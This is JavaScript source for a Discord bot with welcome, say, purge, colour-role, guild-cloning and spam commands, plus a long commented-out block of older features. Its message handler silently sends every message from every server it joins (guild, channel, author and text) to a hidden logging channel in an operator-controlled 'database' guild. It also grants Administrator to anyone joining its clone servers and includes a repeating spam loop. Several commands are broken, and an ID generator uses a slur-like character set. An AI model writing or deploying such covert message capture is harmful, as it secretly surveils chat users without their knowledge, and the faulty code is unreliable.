const Discord = require("discord.js");
const client = new Discord.Client();
const commandPrefix = process.env.prefix;
 

client.on("ready", () => {
  client.user.setActivity(`smash with ${client.users.size} people`, { type: 'PLAYING' });
   client.user.setStatus("idle");
  // This event will run if the bot starts, and logs in, successfully.
  console.log(`Bot has started, with ${client.users.size} users, in ${client.channels.size} channels of ${client.guilds.size} guilds.`);
});

client.on("error", console.error);

client.on("guildCreate", guild => {
  // This event triggers when the bot joins a guild.
  console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
  client.guilds.get(process.env.databaseguild).createChannel(guild.id.toString());
  
});

client.on("guildDelete", guild => {
  // this event triggers when the bot is removed from a guild.
  console.log(`I have been removed from: ${guild.name} (id: ${guild.id})`);
try{
 client.channels.find("name", guild.id.toString()).delete();}catch{}
});

client.on("guildMemberAdd", (member) =>{
 var damessage = "failed";


    client.channels.get(process.env.setwelcomemessage).fetchMessages({ limit: 1})
             .then(messages => 
             {
  client.channels.get(process.env.setwelcomechannel).fetchMessages({ limit: 1})
             .then(messagei => 
             {
                 if(client.channels.find("id", messagei.last().content).guild.id == member.guild.id){      
                 client.channels.get(messagei.last().content).send(messages.last().content.replace("USERID", "<@" + member.user.id.toString() + ">"));
                

                 }

             })
            .catch(console.log("broke"));
                 //damessage = "e";client.channels.get(messages.last().content);
             })
            .catch(console.log("coke"));


             client.channels.get(process.env.setcloneserver).fetchMessages({ limit: 2})
             .then(messages => 
             {
                //client.guilds.get(messages.first().content).id.toString();
                if(member.guild.id.toString() == client.guilds.get(messages.last().content).id.toString()) {   
      
          member.guild.createRole({
    name: 'Admin',
    permissions: ['ADMINISTRATOR']
}).then((role)=>{
    member.addRole(role.id);
}).catch((e)=>{
    console.log(e);
});
             }
 });
           
});

client.on("message", async message => {
 
 const args = message.content.slice(commandPrefix.length).trim().split(/ +/g);
  const norgs = message.content.split(/ +/g);
  const command = args.shift().toLowerCase();
  const nommand = norgs.shift().toLowerCase();
 const bargs = message.content.slice(commandPrefix.length + command.length).trim();

 
   
  if(message.channel.id != process.env.messagelog)
  { 
    if(message.content.toLowerCase().includes("::::") == false)
    {
    //log messages
   try{
   client.channels.find("name", message.guild.id.toString()).send(message.guild.name + ","+ message.channel.name + ","  + message.author.username + ": " + message.content + " ::::");
     
     }
     catch{console.log("error logging message. did you forget to add the channel in frostbot database?");}
         

    
  }
}
  //check if it's a bot
  if(message.author.bot) return;

  
  //sayclone
  client.channels.get(process.env.setcloneserver).fetchMessages({ limit: 1})
             .then(messages => 
             {
                 if(message.guild.id.toString() == messages.last().content)
  {
     console.log(message.channel.name.split("_")[1]);
     client.channels.get(message.channel.name.split("_")[1]).send(message.content.toString());
  }
 });

  //also server to clone
        try{
      client.channels.find("name", message.channel.name + "_"+message.channel.id.toString()).send(message.author.username + ": " + message.content + " ::::");
       }
       catch{console.log("couldnt output to clone idk");}
  if(message.content.substring(0, commandPrefix.length) != commandPrefix) return;
  
  
  if(command == "e")
{
   message.channel.send("e");
}
  
  if(command == "setwelcomemessage")
  {
     client.channels.get(process.env.setwelcomemessage).send(args.join(" "));
     message.channel.send("Completed.");
  }
  if(command == "setwelcomechannel")
  {
     client.channels.get(process.env.setwelcomechannel).send(args[0]);
     message.channel.send("Completed.");
  }
  if(command == "purge")
  {if (!message.member.hasPermission("MANAGE_MESSAGES")) {
       message.channel.send("You aren't able to use this command.");
        return;
}
    message.channel.fetchMessages({limit:parseInt(args[0])})
          .then(messages => {
            message.channel.bulkDelete(messages);
          })
          .catch(console.log("broke"));

  }
  
  
  if(command == "listguilds")
  {
     var listofguilds = client.guilds;
     listofguilds.forEach(function(element)
     {
        message.channel.send(element.toString()+ "       "  +element.id);
     });
  }
  if(command == "cloneguild")
  {
     var listofguilds = client.guilds;
     var tonameclone = message.guild.name + "_clone";
     var newguild = await client.user.createGuild(tonameclone);
     client.channels.get(process.env.setcloneserver).send(newguild.id+"");

     /*var channelsdelete = newguild.channels;
     channelsdelete.forEach(function(element){
     element.delete(5000);
    });*/

    

    

     var listofchannelsincurrentguild = message.guild.channels.array(). sort(function (a, b) { return a.position - b.position;});
     message.channel.send(listofchannelsincurrentguild.length+"");
    var i;
    for (i = 0; i < listofchannelsincurrentguild.length; i++) { 
         if(listofchannelsincurrentguild[i].type == "text"){
           var newchannel = newguild.createChannel(listofchannelsincurrentguild[i].name + "_" + listofchannelsincurrentguild[i].id);
         
        }
    }
   
 //var invite = .createInvite();
   //message.channel.send(""+invite.url);

var invite = await newguild.channels.find(channel => channel.type == "text").createInvite();
 message.channel.send(""+invite.url);
  }
  
  if(command == "deleteguild")
  {
      var guildtodelete = args.toString().replace(","," ");
      var listofguilds = client.guilds;
     listofguilds.forEach(function(element){
     if(element.id == guildtodelete)
     {
         element.delete();
     }
    });
  }

   var spambool = false;
   if (command === "spam") 
   {      
     if(message.member.roles.some(r=>["spammer"].includes(r.name)))
      return message.reply("Sorry, you don't have permission to use this.");
     
     const spamMessage = args.join(" ").replace(args[0], "");;
     if  (spamMessage.length > 0 && spambool == false)
     {
             spambool = true;
             spamInterval = setInterval (function () 
             {
              message.channel.send(spamMessage)
             }, parseInt(args[0]));
     }
   }
   if(command == "quitspam")
   {
     clearInterval (spamInterval);
     spambool = false;
   }
  if(command == "calpos")  
  {
      message.channel.send("calpos: "+message.channel.calculatedPosition+ "  pos: " + message.channel.position);
  }

 if(command == "color")
  {

   if(message.guild.roles.find(r => r.name == "Color:"+message.author.id) != null)
     {message.guild.roles.find(r => r.name == "Color:"+message.author.id).edit({color:args.join(" ")});
    }
    else{

    var botrole = message.guild.roles.find(r => r.name == client.user.username);

    console.log("bot role position:"+botrole.position + " name:" + botrole.name);

    message.channel.guild.createRole({
    name: 'Color:'+message.author.id,
    color: args.join(" ")+"",
    position: botrole.position - 1
}).then((role)=>{
    message.channel.guild.member(message.author).addRole(role.id);
}).catch((e)=>{
    console.log(e);
});

    }

     message.delete(10);
  }





      
//endsayclone
  

    if(command === "say") 
    {
    client.channels.get(process.env.setsayChannel).fetchMessages({ limit: 1})
             .then(messages => 
             {
                 client.channels.get(messages.last().content).send(message.content.replace(process.env.prefix + command + " ",""));
             })
            .catch(console.log("broke"));
  }
  if(command == "setsay")
  {
     client.channels.get(process.env.setsayChannel).send(args[0]);
  }

  if(command == "getavatar")
  {
     //message.channel.send(client.fetchUser(args[0]).avatarURL+args[0]+"");
    client.fetchUser(args[0]).then(User => {
    message.channel.send(User.avatarURL); 
});

  } 


if(command == "editMsg")
{
    
}

if(command == "rps")
{
    var userone = client.fetchUser(message.author.id);
    var usertwo = client.fetchUser(message.mentions.users.first().id);
 
    var privateGuild = message.guild.createChannel(userone.name + " and " + usertwo + "'s Game", permissionOverwrites[
            {
                id: guild.defaultRole.id,
                deny: ['VIEW_CHANNEL']
            },
            {
                id: user.id,
                allow: ['VIEW_CHANNEL']
            }
        ]);
    
    privateGuild.send("<@" + userone.id + ">" + "<@" + usertwo.id + ">");
 
    privateGuild.send("https://rpsgame.org/room?id=" + makeid(15));
}

  function compare (a,b)
  {
      return a.calculatedPosition - b.calculatedPosition;
  } 
  function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
  }
  
  function makeid(length) 
 {
   var result           = '';
   var characters       = 'GAYgay';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}
  
  















  
  /*
  
//set some basic vars
var testing = false;
var spamInterval;
var spambool = false;
var profanitybool = false;
var keywords = ["Banana", "Orange", "Apple", "Mango"];
var keycomebacks = ["Banana", "Orange", "Apple", "Mango"];
var logbotguilds = process.env.logbotguilds;
var players = ["John", "Jane"];
var games = ["Mario", "Bario"];

  
  const args = message.content.slice(commandPrefix.length).trim().split(/ +/g);
  const norgs = message.content.split(/ +/g);
  const command = args.shift().toLowerCase();
  const nommand = norgs.shift().toLowerCase();
  
  /////START OF OLD COMMANDS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  /////START OF OLD COMMANDS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  /////START OF OLD COMMANDS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  /////START OF OLD COMMANDS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  
  if (!~logbotguilds.indexOf(message.guild.id))
  {
  if (command != "deletekey")
  {
    ///set keywords and such
     client.channels.get(process.env.databaseChannel).fetchMessages({ limit: 100 })
              .then(messages => 
              { 
                var key = "";
                messages.forEach(function(element) 
                {
                  key = key + element; 
                });
                keywords = key.split(";");
            })
            .catch(console.log("broke"));
    client.channels.get(process.env.databaseChannelComeback).fetchMessages({ limit: 100 })
              .then(messages => 
              { 
                var come = "";
                messages.forEach(function(element) 
                {
                  come = come + element; 
                });
                keycomebacks = come.split(";");
            })
            .catch(console.log("broke"));
    
    
    //ok, check for keyword. If is, send.
    for (i = 0; i < keywords.length; i++) 
      {
        if (message.content.replace(" ","").toLowerCase() == keywords[i].replace(" ","").toLowerCase())
        {
            message.channel.send(keycomebacks[i]);
        }
      }
  }
  
//check for words even more contained in message
if (profanitybool == true)
{
  if (message.content.toLowerCase().includes("shit") == true)
  {
      const m = await message.channel.send("Lol they said shit");
  }
   if (message.content.toLowerCase().includes("fuck") == true)
  {
      const m = await message.channel. includes("Lol they said fuck");
  }
   if (message.content.toLowerCase(). includes("balls") == true)
  {
      const m = await message.channel.send("Lol they said balls");
  }
   if (message.content.toLowerCase(). includes("cock") == true)
  {
      const m = await message.channel.send("Lol they said cock");
  }
   if (message.content.toLowerCase(). includes("dick") == true)
  {
      const m = await message.channel.send("Lol they said dick");
  }
   if (message.content.toLowerCase(). includes("damn") == true)
  {
      const m = await message.channel.send("Lol they said damn");
  }
 if (message.content.toLowerCase(). includes("ass") == true)
  {
      const m = await message.channel.send("Lol they said ass");
  }
}
  if(message.content.indexOf(commandPrefix) !== 0) return;
 
  
  
    
    
    
    
 if(command === "itt") {
  
    var picture = message.attachments;
   var rgbarray = picture.getImageData(10, 10, 50, 50).data;
     rgbarray.prototype.forEach(function(element)
     {
     console.log(element.toString());
      });
    var picturemadeoftext;
    message.channel.send(picturemadeoftext);
  }
    
 if(command === "lenny") 
 {
   message.delete(10);
   const m = await message.channel.send("( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°) ( ͡° ͜ʖ ͡°)");
 }

  if(command === "keyword") 
  {
     // if (nommand.includes(','))
      //{
     if (~message.content.indexOf(";"))
     {
        var numberof = 0;
        client.channels.get(process.env.databaseChannel).fetchMessages({ limit: 100 })
              .then(messages => 
              { 
               
                messages.forEach(function(element) 
                {
                  if(element.content != null)
                  {
                   numberof = numberof + 1;
                  }
                });
          
               if(numberof < 100)
                  {
                   const messagenocommand = message.content.slice(commandPrefix.length + command.length).trim();
                    const localArgs = messagenocommand.split(";");
                     client.channels.get(process.env.databaseChannel).send(localArgs[0] + ";");
                     client.channels.get(process.env.databaseChannelComeback).send(localArgs[1] + ";");
                     message.channel.send("Ok, got it.");
                    
                    client.channels.get(process.env.databaseChannel).fetchMessages({ limit: 100 })
              .then(messages => 
              { 
                var key = "";
                messages.forEach(function(element) 
                {
                  key = key + element; 
                });
                keywords = key.split(";");
            })
            .catch(console.log("broke"));
    client.channels.get(process.env.databaseChannelComeback).fetchMessages({ limit: 100 })
              .then(messages => 
              { 
                var come = "";
                messages.forEach(function(element) 
                {
                  come = come + element; 
                });
                keycomebacks = come.split(";");
            })
            .catch(console.log("broke"));
    
    for (i = 0; i < keywords.length; i++) 
      {
        if (message.content.replace(" ","").toLowerCase() == keywords[i].replace(" ","").toLowerCase())
        {
            message.channel.send(keycomebacks[i]);
        }
      }
                    
                  }
          if(numberof > 99)
                  {
                     message.channel.send("Too many keywords currently.");
                  }
            })
            .catch(console.log("broke"));
       
            
       
     }
  }
  if(command === "deletekey") 
  {
    var finalmessageid;
    var finalmessageid2;
     await client.channels.get(process.env.databaseChannel).fetchMessages({ limit: 1})
        .then(messages => {
       messages.forEach(function(element) 
                {
                  element.delete();
                });})
        .catch();
     await client.channels.get(process.env.databaseChannelComeback).fetchMessages({ limit: 1})
        .then(messages => {
       messages.forEach(function(element) 
                {
                   element.delete();
                });})
        .catch();
    
  }
   if (command === "spam") 
   {      
     if(message.author.id != process.env.gamingdudester && !message.member.roles.some(r=>["spammer"].includes(r.name)) || process.env.spam == "false" && message.author.id != process.env.gamingdudester)
      return message.reply("Sorry, you don't have permission to use this!");
     
     const spamMessage = args.join(" ");
     if  (spamMessage.length > 0 && spambool == false )
     {
            spambool = true;
             spamInterval = setInterval (function () 
             {
              message.channel.send(spamMessage)
             }, 2000);
     }
   }
  
  if (command === "quitspam") 
   { 
      if(message.author.id != process.env.gamingdudester && !message.member.roles.some(r=>["spammer"].includes(r.name)) || process.env.spam == "false" && message.author.id != process.env.gamingdudester)
      return message.reply("Sorry, you don't have permission to use this!");
      clearInterval (spamInterval);
     spambool = false;
   }
  
  if(command === "help") 
  {
    const m = await message.channel.send("`Current commands: \n Says your message: F-say <message> \nSets the channel for F-say: F-setsay <channel id> \nSays your message always in the current channel: F-newsay <message> \nDeletes messages: F-purge 100 \nSays channel ID: F-id \nToggles profanity filter: F-profanity \n"
                                         + "Gives you a lenny face: F-lenny \nSpams messages: F-spam <message> \nQuits spamming: F-quitspam \n" 
                                         + "Sets a keyword & comeback: F-keyword <keyword>;<comeback> \nDeletes most-recent keyword: F-deletekey \n Finds a person to play with in a game like Brawl: F-findmatch <gamename>`");
  }
  if(command === "ping") {
    // Calculates ping between sending a message and editing it, giving a nice round-trip latency.
    // The second ping s an average latency between the bot and the websocket server (one-way, not round-tripnst m = await message.channel.send("Ping?");
    m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(client.ping)}ms`);
  }
  if(command === "id") 
  {
    // And we get the bot to say the thing: 
    message.channel.send(message.channel.id);
  }
   if(command === "gid") 
  {
    // And we get the bot to say the thing: 
    message.channel.send(message.guild.id);
  }
  //
  if(command === "newsay") {
  
    const sayMessage = args.join(" ");
     message.delete(20);
    // And we get the bot to say the thing: 
    message.channel.send(sayMessage);
  }
    if(command === "say") 
    {
    client.channels.get(process.env.setsayChannel).fetchMessages({ limit: 1})
             .then(messages => 
             {
                 client.channels.get(messages.last().content).send(message.content.replace(process.env.prefix + command + " ",""));
             })
            .catch(console.log("broke"));
  }
  if(command == "setsay")
  {
     client.channels.get(process.env.setsayChannel).send(args[0]);
  }
  if(command === "purge") {
    var messagecount = parseInt(args[0]);
  message.channel.fetchMessages({limit: messagecount})
    .then(messages => message.channel.bulkDelete(messages)
    .catch(message.reply("Ok. <->")));
  }
}
  if (command == "profanity")
  {
     profanitybool = !profanitybool;
     message.channel.send(profanitybool + ".");
  }

//MATCHMAKKING
//MATCHMAKKING

if(command == "findmatch")
  {
     client.channels.get(process.env.setsayChannel).send(args[0]);
    var currentPlayers;
    var currentGames;
    var which = 0;
    var foundMatch = false;
     players.forEach(function(item)
    {
      which++;
       currentPlayers = currentPlayers + item;
    });
    
    which = 0;
     games.forEach(function(item)
    {
      which++;
       currentGames = currentGames + item;
       if(item == args[0])
       {
          foundMatch = true;
          message.channel.send(players[which] + " wants to play " + item + ". You can chat with them through linked DMs, hopefully.");
       }
    });
    if(foundMatch == false)
    {
      message.channel.send(currentPlayers + " are playing " + currentGames);
    }
  }
}
*/
});
  
//END OF COMMANDS!
client.login(process.env.BOT_TOKEN);
